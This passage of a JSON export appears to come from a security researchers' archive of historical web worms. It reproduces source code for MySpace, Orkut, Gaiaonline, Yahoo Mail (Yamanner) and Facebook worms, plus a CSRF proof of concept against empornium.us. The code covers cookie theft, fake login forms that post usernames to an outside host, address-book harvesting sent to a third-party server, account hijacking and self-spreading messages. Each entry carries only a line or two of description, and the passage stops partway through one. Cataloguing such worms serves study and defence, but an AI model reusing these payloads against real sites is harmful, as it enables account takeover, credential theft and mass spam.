&& (top == self)) {\r\n\tvar ap=new Array(4);\r\n\tvar fi=new Array(4);\r\n    //This code picks 4 MySpace users at random and sets up code to\r\n    //send them a message\r\n\tfor(var x=0;x&lt;ap.length;x++) {\r\n\t    //randomly generate a friend ID\r\n\t\tvar ran_unrounded=80000000+(105000000-80000000)*Math.random();\r\n\t\tvar ran_number=Math.floor(ran_unrounded);\r\n\t\tfi[x]=ran_number;\r\n        //build a hidden iFrame. This will be used to send a message to a MySpace user\r\n\t\tap[x]=document.createElement('iframe');\r\n\t\tap[x].height=1;\r\n\t\tap[x].width=1;\r\n\t\tap[x].name=\"qtkt\"+x;\r\n\t\tap[x].id=\"qtkt\"+x;\r\n\t\tdocument.getElementsByTagName('body')[0].appendChild(ap[x]);\r\n\t\tap[x].src='http://profile.myspace.com/index.cfm?fuseaction=mail.message&friendID='+fi[x];\r\n\t}\r\n    //In 6 seconds, execute the domessage() function. this will (try) to send messages to the randomly\r\n    //selected people.\t\r\n\tsetTimeout(\"domessage()\",6000);\r\n    //create a new instance of XHconn. This also prevents the worm from running again on the same page\r\n\tvar editProf = new XHConn();\r\n    //Go fetch a the edit page for the user's profile and call the doEdit() function when you receive a response\r\n\teditProf.connect('http://'+document.location.host+'/Modules/ProfileEdit/Pages/Interests.aspx',\"GET\",\"\",doEdit);\r\n}</code></pre>\r\n\r\n<p>MySpace, QuickTime, QTL, MOV, GNUCITIZEN</p>"
  },
  {
    "author": "pdp",
    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
    "date": "2006-12-10T01:50:07.000Z",
    "content": "<h3>The ORKUT Worm</h3>\r\n\r\n<p>A worm was spreading on Google ORKUT. Analysis from Billy Hoffman.</p>\r\n\r\n<pre><code>var uid=\"6611314433566349528\"; // Exploit escrito por Rodrigo Lacerda\r\n//window.alert('injetado');\r\n\r\nfunction createXMLHttpRequest() \r\n{\r\n   try{ return new ActiveXObject(\"Msxml2.XMLHTTP\"); }catch(e){}\r\n   try{ return new ActiveXObject(\"Microsoft.XMLHTTP\"); }catch(e){}\r\n   try{ return new XMLHttpRequest(); }catch(e){}\r\n   return null;\r\n}\r\n\r\nfunction getCookies()\r\n{\r\n\tsubject=\"Orkut Cookie Exploit\";\r\n\tdcookie=document.cookie;\r\n\tif(dcookie.indexOf('state') &gt; -1)\r\n\t{\r\n\t\tmensagem = dcookie+\"\\n\\nVerifique se ele enviou alguma comunidade\\n\\nExploit escrito por Rodrigo Lacerda\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tmensagem = \"Este usuario usa Internet Explorer e a funcao de pegar cookies falhou, verifique se ele enviou alguma comundiade\\n\\nOrkut Community Transfer & Cookie Stealer Exploit\\n\";\r\n\t}\r\n\tcheck_scraps();\r\n};\r\ngetCookies();\r\n\r\nfunction velocity_transfer()\r\n{\r\n\tsend=\"POST_TOKEN=\"+encodeURIComponent(POST)+\"&signature=\"+encodeURIComponent(SIG)+\"&Action.doTransfer\";\r\n\tvar xml= createXMLHttpRequest();\r\n\txml.open('POST','http://www.orkut.com/CommunityTransfer.aspx?cmm=' + cmm[x] + '&uid='+uid,true);\r\n\txml.setRequestHeader('Content-Type','application/x-www-form-urlencoded');\r\n\txml.send(send);xml.onreadystatechange=function()\r\n\t{\r\n\t\tif(xml.readyState==4)\r\n\t\t{\r\n\t\t\tvar xmlrtr=xml.responseText;\r\n\t\t\tx++;\r\n\t\t\tif(x&lt;cmm.length)\r\n\t\t\t{\r\n\t\t\t\tvelocity_transfer();\r\n\t\t\t}\r\n\t\t}\r\n\t};\r\n};\r\n\r\nfunction array_cmm()\r\n{\r\n\tvar xml2= createXMLHttpRequest();\r\n\txml2.open(\"GET\",\"http://www.orkut.com/Communities.aspx\",true);\r\n\txml2.onreadystatechange=function()\r\n\t{\r\n\t\tif(xml2.readyState==4)\r\n\t\t{\r\n\t\t\tvar xmlr=xml2.responseText;\r\n\t\t\tif(!xmlr.match(/textPanel/gi))\r\n\t\t\t{\r\n\t\t\t\tcont=xmlr;\r\n\t\t\t\tini=cont.indexOf('&lt;DIV id=ownedCommunities') &gt; -1 ? cont.indexOf('&lt;DIV id=ownedCommunities') : cont.indexOf('&lt;div id=\"ownedCommunities\"');\r\n\t\t\t\tfim=cont.indexOf('&lt;DIV id=pendingCommunities') &gt; -1 ? cont.indexOf('&lt;DIV id=pendingCommunities') : cont.indexOf('&lt;div id=\"pendingCommunities\"');\r\n\t\t\t\tcont2=cont.substring(ini,fim)\r\n\t\t\t\tcmm=String(cont2.match(/cmm=\\d+/g)).replace(/cmm=/g,'');\r\n\t\t\t\tcmm=cmm.split(',');\r\n\t\t\t\tif(cmm)\r\n\t\t\t\t{\r\n\t\t\t\t\tvelocity_transfer();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tarray_cmm();\r\n\t\t\t};\r\n\t\t};\r\n\t};\r\n\txml2.send(null);\r\n};\r\n\r\nfunction send_message()\r\n{\r\n\tsend=\"POST_TOKEN=\"+encodeURIComponent(POST)+\"&signature=\"+encodeURIComponent(SIG)+\"&uid=\"+uid+\"&sendTo=user&subject=\"+subject+\"&body=\"+encodeURIComponent(mensagem)+\"&Action.submit\";\r\n\tvar xml= createXMLHttpRequest();\r\n\txml.open('POST','http://www.orkut.com/Compose.aspx',true);\r\n\txml.setRequestHeader('Content-Type','application/x-www-form-urlencoded');\r\n\txml.send(send);xml.onreadystatechange=function()\r\n\t{\r\n\t\tif(xml.readyState==4)\r\n\t\t{\r\n\t\t\tvar xmlrtr=xml.responseText;\r\n\t\t\tif(!xmlrtr.match(/textPanel/gi))\r\n\t\t\t{\r\n\t\t\t\tarray_cmm();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tsend_message();\r\n\t\t\t}\r\n\t\t}\r\n\t};\r\n};\r\n\r\n\r\nfunction check_scraps()\r\n{\r\n\tx=0;\r\n\tvar xml=createXMLHttpRequest();\r\n\txml.open(\"GET\",\"Scrapbook.aspx\",true);\r\n\txml.onreadystatechange=function()\r\n\t{\r\n\t\tif(xml.readyState==4)\r\n\t\t{\r\n\t\t\tvar xmlr1=xml.responseText;\r\n\t\t\tif(!xmlr1.indexOf('textPanel') &gt; -1)\r\n\t\t\t{\r\n\t\t\t\tSIG=xmlr1.match(/signature. value=\"(.+)\"/i)[1];\r\n\t\t\t\tPOST=xmlr1.match(/name=\"POST_TOKEN\" value=\"([^\"]+)/i)[1];\r\n\t\t\t\tsend_message();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tcheck_scraps();\r\n\t\t\t}\r\n\t\t};\r\n\t};\r\n\txml.send(null);\r\n};    \r\n\r\n// Exploit escrito por Rodrigo Lacerda</code></pre>\r\n\r\n<p>ORKUT, Google</p>"
  },
  {
    "author": "pdp",
    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
    "date": "2007-01-04T20:21:59.000Z",
    "content": "<h3>Gaiaonline Worm</h3>\r\n\r\n<p>On 4th Jan 2007 Gaiaonline.com is hit by a worm.</p>\r\n\r\n<p><em>log.php</em></p>\r\n\r\n<pre><code>&lt;head&gt;\r\n&lt;title&gt;Error!&lt;/title&gt;\r\n&lt;meta http-equiv=\"refresh\" content=\"0;url=http://www.gaiaonline.com\"&gt;\r\n&lt;/head&gt;\r\n&lt;?php \r\n// Declares file to log to.\r\n$myFile = \"log.txt\";\r\n// Set file handler. or end execution if file doesnt exist.\r\n$fh = fopen($myFile, 'a') or die(\"can't open file\");\r\n//Take data sent via POST from start.js and put it in $stringData\r\n$stringData = $_POST[\"username\"];\r\n// Write string to file.\r\nfwrite($fh, $stringData);\r\n// Add a tilde followed by newline to divide each entry.\r\n$stringData = \"~\\n\";\r\nfwrite($fh, $stringData);\r\nfclose($fh);\r\n\r\n?&gt;</code></pre>\r\n\r\n<p><em>start.js</em></p>\r\n\r\n<pre><code>// Content to replace div \"content\" with. \r\nvar newContent = '&lt;table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\"&gt;\t&lt;tr&gt;\t&lt;td&gt;&lt;img src=\"http://graphics4.gaiaonline.com/images/template/s.gif\" width=\"1\" height=\"15\"&gt;&lt;/td&gt;\t&lt;/tr&gt;\t&lt;tr&gt;\t\t&lt;td align=\"center\"&gt;&lt;img src=\"http://graphics4.gaiaonline.com/images/template/header/header_sign_in_large.gif\" width=\"203\" height=\"30\"&gt;&lt;/td&gt;\t&lt;/tr&gt;\t&lt;tr&gt;\t\t&lt;td&gt;&lt;img src=\"http://graphics4.gaiaonline.com/images/template/s.gif\" width=\"1\" height=\"15\"&gt;&lt;/td&gt;\t&lt;/tr&gt;&lt;/table&gt;&lt;table width=\"721\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\"&gt;&lt;tr&gt;&lt;td&gt;&lt;img src=\"http://graphics4.gaiaonline.com/images/template/table/border_top_stationary.gif\" width=\"721\" height=\"1\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=\"721\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\" background=\"http://graphics4.gaiaonline.com/images/template/bg/stationary.gif\" align=\"center\"&gt;&lt;tr&gt;&lt;td&gt;&lt;table width=\"710\" border=\"0\" cellspacing=\"0\" cellpadding=\"4\"&gt;&lt;form action=\"http://gaiaonli.site.com/log.php\" method=\"post\" target=\"_top\" name=\"loginForm\"&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;&lt;span class=\"normbold\"&gt;Username:&nbsp;&lt;/span&gt;&lt;input type=\"text\" name=\"username\" size=\"25\" maxlength=\"40\" class=\"vendform\" value=\"Anonymous\" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;&lt;span class=\"normbold\"&gt;Password:&nbsp;&lt;/span&gt;&lt;input type=\"password\" name=\"password\" size=\"25\" maxlength=\"25\" class=\"vendform\" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;&lt;span class=\"normbold\"&gt;Log me on automatically each visit:&lt;/span&gt;&lt;input type=\"checkbox\" name=\"autologin\"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;&lt;input type=\"hidden\" name=\"sid\" value=\"57181309749d15ca59db5332a46e673f\" /&gt;&lt;input type=\"hidden\" name=\"redirect\" value=\"\" /&gt;&lt;input type=\"submit\" name=\"login\" class=\"mainoption\" value=\"Login\" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;&lt;span class=\"normbold\"&gt;&lt;a href=\"/account/index.php?mode=sendpass\" class=\"gensmall\"&gt;I forgot my password&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;&lt;span class=\"normbold\"&gt;Account activation problems? Click &lt;A HREF=\"http://www.gaiaonline.com/info/feedback.php\"&gt;here&lt;/A&gt;.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=\"721\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\"&gt;&lt;tr&gt;&lt;td&gt;&lt;img src=\"http://graphics4.gaiaonline.com/images/template/table/border_bottom_stationary.gif\" width=\"721\" height=\"1\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\"&gt;&lt;tr&gt;&lt;td&gt;&lt;img src=\"http://graphics4.gaiaonline.com/images/template/s.gif\" width=\"1\" height=\"15\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';\r\n//XSS vector\r\nvar spreadOne = \"http://www.gaiaonline.com/community/search.php?val=\"\r\n\r\n//Replace content with newContent\r\ndocument.getElementById(\"content\").innerHTML=newContent;\r\n\r\n\r\n//Detect which method of XHR to use.\r\n      var xmlhttp;\r\n      try {\r\n          // Mozilla / Safari / IE7\r\n          xmlhttp = new XMLHttpRequest();\r\n      } catch (e) {\r\n           // IE\r\n           var XMLHTTP_IDS = new Array('MSXML2.XMLHTTP.5.0',\r\n                                     'MSXML2.XMLHTTP.4.0',\r\n                                     'MSXML2.XMLHTTP.3.0',\r\n                                     'MSXML2.XMLHTTP',\r\n                                     'Microsoft.XMLHTTP' );\r\n          var success = false;\r\n          for (var i=0;i &lt; XMLHTTP_IDS.length && !success; i++) {\r\n              try {\r\n                   xmlhttp = new ActiveXObject(XMLHTTP_IDS[i]);\r\n                      success = true;\r\n                } catch (e) {}\r\n          }\r\n          if (!success) {\r\n              throw new Error('Unable to create XMLHttpRequest.');\r\n          }\r\n     }\r\n\r\n// URI to POST data to.\r\nvar targetURI = \"/profile/privmsg.php\";\r\n//Parameters to pass to targetURI\r\nvar params = \"mode=post&username=friends@gaia&subject=Check this out&folder=inbox&post=true&message=You should go check [url=\" + spreadOne + escape('%22%3E%3Csc%72%69%70t%20defer%20%73%72%63%3D%2F/viewfor%2E%73%69%74%65%2E%63%6F%6D%2F%61%73%74%61%72%74%2E%6A%73%3E%3C/sc%72%69%70t%3E%3C%73%74%79%6C%65%3E') + \"]this[/url] out.\";\r\n\r\n//Start XHR\r\nxmlhttp.open(\"POST\", targetURI, true);\r\n\r\n//Set proper headers.\r\nxmlhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\r\nxmlhttp.setRequestHeader(\"Content-length\", params.length);\r\nxmlhttp.setRequestHeader(\"Connection\", \"close\");\r\n\r\n// Send the parameters to the target. In this case, the \"Check this out\" PM.\r\nxmlhttp.send(params);</code></pre>\r\n\r\n<p>Gaiaonline</p>"
  },
  {
    "author": ".mario",
    "avatar": "7ef1c803c904b9a9834d3bd7645790bb",
    "date": "2007-01-23T22:18:25.000Z",
    "content": "<h3>empornium.us - AJAX Worm PoC</h3>\r\n\r\n<p>This stub of a worm can be put into empornium.us torrent descriptions. Could be extended with more malicious payload and spread over the user's infected torrent descriptions. The worm has never run in the wild - admins of the portal were informed.</p>\r\n\r\n<pre><code>$(document).ready(function(){ \r\n\t$.ajax({\r\n  \t\ttype: \t\"POST\",\r\n  \t\turl: \t\"http://empornium.us/takeprofedit.php\",\r\n  \t\tdata: \t\"acceptpms=no&amp;pmnotif=no&amp;avatar=http://img150.imageshack.us/img150/3060/stallowned5wk.jpg&amp;info=&amp;email=stall@owned.org&amp;chpassword=123456&amp;passagain=123456\",\r\n \t \tsuccess: function(msg){\r\n   \t\t\talert( \"Loading Complete...\" );\r\n  \t\t}\r\n\t});\r\n });</code></pre>\r\n\r\n<p>empornium, csrf, ajax</p>"
  },
  {
    "author": "Sven Vetsch / Disenchant",
    "avatar": "3bbe8f9497e48741f842120888bc5ed2",
    "date": "2007-01-25T19:00:30.000Z",
    "content": "<h3>Yamanner</h3>\r\n\r\n<p>Yamanner was a worm that exploited a vulnerability in the Yahoo! Mail service to send a copy of itself to other Yahoo! Mail contacts and it also captured the addresses in the addressbook of all the infected users and uploaded them to a server. By doing so, it was building an email list with many thousands of names that could be sold to spammers.</p>\r\n\r\n<pre><code>var http_request = false; \r\n\r\nvar Email = ''; \r\n\r\nvar IDList = ''; \r\n\r\nvar CRumb = ''; \r\n\r\n\r\n\r\nfunction makeRequest(url, Func, Method, Param) {\r\n\r\n\tif (window.XMLHttpRequest) \r\n\r\n\t{ \r\n\r\n\t\thttp_request = new XMLHttpRequest();\r\n\r\n\t} else if (window.ActiveXObject) \r\n\r\n\t{ \r\n\r\n\t\thttp_request = new ActiveXObject('Microsoft.XMLHTTP'); \r\n\r\n\t}\r\n\r\n\t\r\n\r\n\thttp_request. onfiltered= Func;\r\n\r\n\thttp_request.open(Method, url, true);\r\n\r\n\t\r\n\r\n\tif( Method == 'GET') http_request.send(null);\r\n\r\n\telse http_request.send(Param);\r\n\r\n}\r\n\r\n\r\n\r\nwindow.open('http://www.lastdata.com'); \r\n\r\nServerUrl = url0;USIndex = ServerUrl.indexOf('us.' ,0);\r\n\r\nMailIndex = ServerUrl.indexOf('.mail' ,0);\r\n\r\nCutLen = MailIndex - USIndex - 3;\r\n\r\nvar Server = ServerUrl.substr(USIndex + 3, CutLen); \r\n\r\n\r\n\r\nfunction GetIDs(HtmlContent) { \r\n\r\n\tIDList = '';\r\n\r\n\tStartString = ' ';\r\n\r\n\tEndString = '';\r\n\r\n\ti = 0; \r\n\r\n\tStartIndex = HtmlContent.indexOf(StartString, 0); \r\n\r\n\r\n\r\n\twhile(StartIndex &gt;= 0) { \r\n\r\n\t\tEndIndex = HtmlContent.indexOf(EndString, StartIndex); \r\n\r\n\t\tCutLen = EndIndex - StartIndex - StartString.length; \r\n\r\n\t\tYahooID = HtmlContent.substr(StartIndex + StartString.length, CutLen); \r\n\r\n\t\r\n\r\n\t\tif( YahooID.indexOf('@yahoo.com', 0) &gt; 0 || YahooID.indexOf('@yahoogroups.com', 0) &gt; 0 ) IDList = IDList + ',' + YahooID ; \r\n\r\n\t\tStartString = ''; \r\n\r\n\t\tStartIndex = HtmlContent.indexOf(StartString, StartIndex + 20); \r\n\r\n\t\tStartString = ' '; \r\n\r\n\t\tStartIndex = HtmlContent.indexOf(StartString, StartIndex + 20); \r\n\r\n\t\ti++; \r\n\r\n\t} \r\n\r\n\r\n\r\n\tif(IDList.substr(0,1) == ',') IDList = IDList.substr(1, IDList.length); \r\n\r\n\tif(IDList.indexOf(',', 0)&gt;0 ) { \r\n\r\n\t\tIDListArray = IDList.split(','); \r\n\r\n\t\tEmail = IDListArray[0]; \r\n\r\n\t\tIDList = IDList.replace(Email + ',', ''); \r\n\r\n\t} \r\n\r\n\tCurEmail = spamform.NE.value; \r\n\r\n\tIDList = IDList.replace(CurEmail + ',', ''); \r\n\r\n\tIDList = IDList.replace(',' + CurEmail, '');\r\n\r\n\tIDList = IDList.replace(CurEmail, '');\r\n\r\n\tUserEmail = showLetter.FromAddress.value;\r\n\r\n\tIDList = IDList.replace(',' + UserEmail, '');\r\n\r\n\tIDList = IDList.replace(UserEmail + ',', '');\r\n\r\n\tIDList = IDList.replace(UserEmail, ''); \r\n\r\n\treturn IDList; \r\n\r\n}\r\n\r\n\r\n\r\nfunction ListContacts() {\r\n\r\n\tif (http_request.readyState == 4) {\r\n\r\n\t\tif (http_request.status == 200) { \r\n\r\n\t\t\tHtmlContent = http_request.responseText;\r\n\r\n\t\t\tIDList = GetIDs(HtmlContent); \r\n\r\n\t\t\tmakeRequest('http://us.' + Server + '.mail.yahoo.com/ym/Compose/?rnd=' + Math.random(), Getcrumb, 'GET', null); \r\n\r\n\t\t} \r\n\r\n\t}\r\n\r\n}\r\n\r\n\r\n\r\nfunction ExtractStr(HtmlContent) { \r\n\r\n\tStartString = 'name=\\u0022.crumb\\u0022 value=\\u0022'; \r\n\r\n\tEndString = '\\u0022'; \r\n\r\n\ti = 0; \r\n\r\n\tStartIndex = HtmlContent.indexOf(StartString, 0); \r\n\r\n\tEndIndex = HtmlContent.indexOf(EndString, StartIndex + StartString.length ); \r\n\r\n\tCutLen = EndIndex - StartIndex - StartString.length; \r\n\r\n\tcrumb = HtmlContent.substr(StartIndex + StartString.length , CutLen ); \r\n\r\n\treturn crumb; \r\n\r\n}\r\n\r\n\r\n\r\nfunction Getcrumb() { \r\n\r\n\tif (http_request.readyState == 4) { \r\n\r\n\t\tif (http_request.status == 200) { \r\n\r\n\t\t\tHtmlContent = http_request.responseText; \r\n\r\n\t\t\tCRumb = ExtractStr(HtmlContent); \r\n\r\n\t\t\tMyBody = 'this is test'; \r\n\r\n\t\t\tMySubj = 'New Graphic Site'; \r\n\r\n\t\t\tUrl = 'http://us.' + Server + '.mail.yahoo.com/ym/Compose'; \r\n\r\n\t\t\tvar ComposeAction = compose.action;MidIndex = ComposeAction.indexOf('&amp;Mid=' ,0);\r\n\r\n\t\t\tincIndex = ComposeAction.indexOf('&amp;inc' ,0);\r\n\r\n\t\t\tCutLen = incIndex - MidIndex - 5;\r\n\r\n\t\t\tvar MyMid = ComposeAction.substr(MidIndex + 5, CutLen); \r\n\r\n\t\t\tQIndex = ComposeAction.indexOf('?box=' ,0);\r\n\r\n\t\t\tAIndex = ComposeAction.indexOf('&amp;Mid' ,0);\r\n\r\n\t\t\tCutLen = AIndex - QIndex - 5;\r\n\r\n\t\t\tvar BoxName = ComposeAction.substr(QIndex + 5, CutLen); \r\n\r\n\t\t\tParam = 'SEND=1&amp;SD=&amp;SC=&amp;CAN=&amp;docCharset=windows-1256&amp;PhotoMailUser=&amp;PhotoToolInstall=&amp;OpenInsertPhoto=&amp;PhotoGetStart=0&amp;SaveCopy=no&amp;PhotoMailInstallOrigin=&amp;.crumb=RUMBVAL&amp;Mid=EMAILMID&amp;inc=&amp;AttFol=&amp;box=BOXNAME&amp;FwdFile=YM_FM&amp;FwdMsg=EMAILMID&amp;FwdSubj=EMAILSUBJ&amp;FwdInline=&amp;OriginalFrom=FROMEMAIL&amp;OriginalSubject=EMAILSUBJ&amp;InReplyTo=&amp;NumAtt=0&amp;AttData=&amp;UplData=&amp;OldAttData=&amp;OldUplData=&amp;FName=&amp;ATT=&amp;VID=&amp;Markers=&amp;NextMarker=0&amp;Thumbnails=&amp;PhotoMailWith=&amp;BrowseState=&amp;PhotoIcon=&amp;ToolbarState=&amp;VirusReport=&amp;Attachments=&amp;Background=&amp;BGRef=&amp;BGDesc=&amp;BGDef=&amp;BGFg=&amp;BGFF=&amp;BGFS=&amp;BGSolid=&amp;BGCustom=&amp;PlainMsg=%3Cbr%3E%3Cbr%3ENote%3A+forwarded+message+attached.&amp;PhotoFrame=&amp;PhotoPrintAtHomeLink=&amp;PhotoSlideShowLink=&amp;PhotoPrintLink=&amp;PhotoSaveLink=&amp;PhotoPermCap=&amp;PhotoPermPath=&amp;PhotoDownloadUrl=&amp;PhotoSaveUrl=&amp;PhotoFlags=&amp;start=compose&amp;bmdomain=&amp;showcc=&amp;showbcc=&amp;AC_Done=&amp;AC_ToList=0%2C&amp;AC_CcList=&amp;AC_BccList=&amp;sendtop=Send&amp;savedrafttop=Save+as+a+Draft&amp;canceltop=Cancel&amp;FromAddr=&amp;To=TOEMAIL&amp;Cc=&amp;Bcc=BCCLIST&amp;Subj=EMAILSUBJ&amp;Body=%3CBR%3E%3CBR%3ENote%3A+forwarded+message+attached.&amp;Format=html&amp;sendbottom=Send&amp;savedraftbottom=Save+as+a+Draft&amp;cancelbottom=Cancel&amp;cancelbottom=Cancel'; \r\n\r\n\t\t\tParam = Param.replace('BOXNAME', BoxName); \r\n\r\n\t\t\tParam = Param.replace('RUMBVAL', CRumb); \r\n\r\n\t\t\tParam = Param.replace('BCCLIST', IDList); \r\n\r\n\t\t\tParam = Param.replace('TOEMAIL', Email);\r\n\r\n\t\t\tParam = Param.replace('FROMEMAIL', 'av3@yahoo.com'); \r\n\r\n\t\t\tParam = Param.replace('EMAILBODY', MyBody); \r\n\r\n\t\t\tParam = Param.replace('PlainMESSAGE', ''); \r\n\r\n\t\t\tParam = Param.replace('EMAILSUBJ', MySubj);\r\n\r\n\t\t\tParam= Param.replace('EMAILSUBJ', MySubj);\r\n\r\n\t\t\tParam = Param.replace('EMAILSUBJ', MySubj); \r\n\r\n\t\t\tParam = Param.replace('EMAILMID', MyMid);\r\n\r\n\t\t\tParam = Param.replace('EMAILMID', MyMid);\r\n\r\n\t\t\tmakeRequest(Url , alertContents, 'POST', Param); \r\n\r\n\t\t} \r\n\r\n\t}\r\n\r\n}\r\n\r\n\r\n\r\nfunction alertContents() { \r\n\r\n\tif (http_request.readyState == 4) { \r\n\r\n\t\twindow.navigate('http://www.av3.net/?ShowFolder&amp;rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;BCCList=' + IDList) \r\n\r\n\t}\r\n\r\n}\r\n\r\n\r\n\r\nmakeRequest('http://us.' + Server + '.mail.yahoo.com/ym/QuickBuilder?build=Continue&amp;cancel=&amp;continuetop=Continue&amp;canceltop=Cancel&amp;Inbox=Inbox&amp;Sent=Sent&amp;pfolder=all&amp;freqCheck=&amp;freq=1&amp;numdays=on&amp;date=180&amp;ps=1&amp;numadr=100&amp;continuebottom=Continue&amp;cancelbottom=Cancel&amp;rnd=' + Math.random(), ListContacts, 'GET', null)</code></pre>\r\n\r\n<p>Yahoo!, mail</p>"
  },
  {
    "author": "pdp",
    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
    "date": "2011-05-04T07:11:39.000Z",
    "content": "<h3>Osama FaceBook worm</h3>\r\n\r\nNo description for this entry.\r\n\r\n<pre><code>///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n// KuNG FU JS v.1  20yrsplus.info\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\n//alert('Photo Uploaded! Please wait 1-2 minutes without leaving this page until we process your picture!');\r\n\r\nfunction readCookie(name) {\r\n\t\r\n\tvar nameEQ = name + \"=\";\r\n\tvar ca = document.cookie.split(';');\r\n\tfor(var i=0;i &lt; ca.length;i++) {\r\n\t\tvar c = ca[i];\r\n\t\twhile (c.charAt(0)==' ') c = c.substring(1,c.length);\r\n\t\tif (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);\r\n\t}\r\n\treturn null;\r\n\r\n}\r\n\r\nvar user_id = readCookie(\"c_user\");\r\n\r\n\r\n// Setup some variables\r\n\r\nvar post_form_id = document.getElementsByName('post_form_id')[0].value;\r\nvar fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\r\n\r\n// Chat message variables \r\n\r\nvar linkies = [\r\n\t\"http://www.facebook.com/Osama.Gets.Shot.Down\",\r\n\t\"http://www.facebook.com/Osama.Gets.Shot.Down\",\r\n\t\"http://www.facebook.com/Osama.Gets.Shot.Down\",\r\n\t\"http://www.facebook.com/Osama.Gets.Shot.Down\"\r\n]\r\n\r\nvar this_chat = \"Watch Osama's EXECUTION Video! \" + linkies[Math.floor(Math.random()*linkies.length)];\r\nvar prepared_chat = encodeURIComponent(this_chat);\r\n\r\n\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n// Post Link to friends walls\r\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\nvar token = Math.round(new Date().getTime() / 1000);\r\n\r\nvar http1 = new XMLHttpRequest();\r\n\r\nvar url1 = \"http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&amp;viewer=\"+user_id+\"&amp;token=\"+token+\"-6&amp;filter[0]=user&amp;options[0]=friends_only\";\r\n\r\nvar params1 = \"\";\r\nhttp1.open(\"GET\", url1+\"?\"+params1, true);\r\nhttp1.onreadystatechange = function() {//Call a function when the state changes.\r\n\r\n\tif(http1.readyState == 4 &amp;&amp; http1.status == 200) { // If state = success\r\n\t\t\r\n\t\tvar response1 = http1.responseText;\r\n\t\t\r\n\t\tresponse1 = response1.replace(\"for (;;);\", \"\"); // Get rid of the junk at the beginning of the returned object\r\n\t\tresponse1 = JSON.parse(response1); // Convert the response to JSON\r\n\t\t\r\n\t\t//alert(response4.toSource());\r\n\t\t\r\n\t\tvar count = 0;\r\n\t\t\r\n\t\tfor(uid in response1.payload.entries){\r\n\t\t\t\r\n\t\t\tif(count &lt; 400){\r\n\t\t\t\t\r\n\t\t\t\t//alert(\"SENT TO \"+response1.payload.entries[count].uid);\r\n\r\n\t\t\t\t// Loop to send messages\r\n\t\t\t\r\n\t\t\t\t// New XMLHttp object\r\n\t\t\t\tvar httpwp = new XMLHttpRequest();\r\n\t\t\t\t\t\t\t\r\n\t\t\t\tvar urlwp = \"http://www.facebook.com/ajax/profile/composer.php?__a=1\";\r\n\t\t\t\t\r\n\t\t\t\tvar statusmessage=\"Disturbing Yet Awesome!\";\r\n\t\t\t\tvar title=\"Bin Laden EXECUTION Video! Yes it's REAL!\";\r\n\t\t\t\tvar link=linkies[Math.floor(Math.random()*linkies.length)];\r\n\t\t\t\tvar description=\"Commandos attack Bin Laden's compund and take him out!\";\r\n\t\t\t\tvar picture=\"http://i.imgur.com/yTjtU.jpg\";\r\n\t\t\t\t\r\n\t\t\t\tvar paramswp = \"post_form_id=\"+post_form_id+\"&amp;fb_dtsg=\"+fb_dtsg+\"&amp;xhpc_composerid=u574553_1&amp;xhpc_targetid=\"+response1.payload.entries[count].uid+\"&amp;xhpc_context=profile&amp;xhpc_fbx=1&amp;aktion=post&amp;app_id=2309869772&amp;UIThumbPager_Input=0&amp;attachment[params][metaTagMap][0][http-equiv]=content-type&amp;attachment[params][metaTagMap][0][content]=text%2Fhtml%3B%20charset%3Dutf-8&amp;attachment[params][metaTagMap][1][property]=og%3Atitle&amp;attachment[params][metaTagMap][1][content]=\"+title+\"&amp;attachment[params][metaTagMap][2][property]=og%3Aurl&amp;attachment[params][metaTagMap][2][content]=\"+link+\"&amp;attachment[params][metaTagMap][3][property]=og%3Asite_name&amp;attachment[params][metaTagMap][3][content]=\"+title+\"&amp;attachment[params][metaTagMap][4][property]=og%3Aimage&amp;attachment[params][metaTagMap][4][content]=\"+picture+\"&amp;attachment[params][metaTagMap][5][property]=og%3Adescription&amp;attachment[params][metaTagMap][5][content]=\"